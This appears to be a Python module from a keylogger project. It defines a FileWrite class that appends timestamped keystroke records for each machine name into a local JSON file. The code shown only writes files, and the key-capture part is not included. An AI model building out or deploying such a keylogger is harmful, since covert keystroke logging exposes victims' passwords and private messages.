import json
from Ikeylogger import IWriter




class FileWrite(IWriter):
    def __init__(self):
        self.keys = []

    def send_data(self, data, machine_name):
        file_path = f"{machine_name}.json"

        try:
            with open(file_path, "r") as file:
                try:
                    existing_data = json.load(file)
                except json.JSONDecodeError:
                    existing_data = {}
        except FileNotFoundError:
            existing_data = {}

        for timestamp, keys in data.items():
            if timestamp in existing_data:
                existing_data[timestamp].extend(keys)
            else:
                existing_data[timestamp] = keys

        with open(file_path, "w") as file:
            json.dump(existing_data, file)

        print(f"Data saved to {file_path}")

file_writer = FileWrite()